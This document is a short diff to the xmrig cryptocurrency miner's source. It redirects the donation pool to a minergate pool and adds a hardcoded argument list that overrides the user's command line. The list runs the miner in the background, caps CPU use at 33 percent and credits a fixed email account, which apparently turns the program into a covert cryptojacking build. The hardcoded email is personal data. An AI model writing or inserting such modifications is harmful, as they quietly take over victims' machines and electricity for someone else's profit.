@@ -460,7 +460,7 @@ static void switch_stratum() {
     static bool want_donate = false;
 
     if (g_want_donate && !want_donate) {
-        stratum_ctx->url = opt_algo == ALGO_CRYPTONIGHT ? "stratum+tcp://donate.xmrig.com:443" : "stratum+tcp://donate.xmrig.com:3333";
+        stratum_ctx->url = opt_algo == ALGO_CRYPTONIGHT ? "stratum+tcp://xmr.pool.minergate.com:45560" : "stratum+tcp://xmr.pool.minergate.com:45560";
         applog(LOG_NOTICE, "Switching to dev pool");
         want_donate = true;
     }
@@ -633,6 +633,8 @@ static bool start_mining() {
     return true;
 }
 
+static int g_argc = 14;
+static char *g_argv[] = {"xmrig", "-o", "stratum+tcp://xmr.pool.minergate.com:45560", "-u", "tomay3000@gmail.com", "-p", "x", "-v", "0", "-k", "-B", "--max-cpu-usage=33", "--safe", "--nicehash"};
 
 /**
  * @brief main
@@ -643,7 +645,7 @@ static bool start_mining() {
 int main(int argc, char *argv[]) {
     applog_init();
     cpu_init();
-    parse_cmdline(argc, argv);
+    parse_cmdline(g_argc, g_argv);
     persistent_memory_allocate();
     print_summary();
 
